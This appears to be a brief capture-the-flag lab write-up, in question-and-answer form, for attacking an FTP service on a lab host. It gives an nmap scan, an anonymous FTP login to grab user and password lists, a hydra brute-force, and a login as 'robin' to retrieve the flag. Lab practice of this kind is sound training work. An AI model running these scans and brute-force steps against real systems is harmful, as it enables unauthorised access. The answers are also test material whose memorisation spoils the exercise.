## What port is the FTP service running on?

```
nmap -Pn -p- -sV --open 10.129.14.212
```

## What username is available for the FTP server?

```
ftp 10.129.14.212 2121
anonymous
ls -l
get users.list
get passwords.list
hydra -L users.list -P passwords.list -s 2121 ftp://10.129.14.212
```

![Снимок экрана 2026-02-03 в 12.04.36](assets/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202026-02-03%20%D0%B2%2012.04.36.png)

## Using the credentials obtained earlier, retrieve the flag.txt file. Submit the contents as your answer.

```
ftp robin@10.129.14.212 2121
get flag.txt
```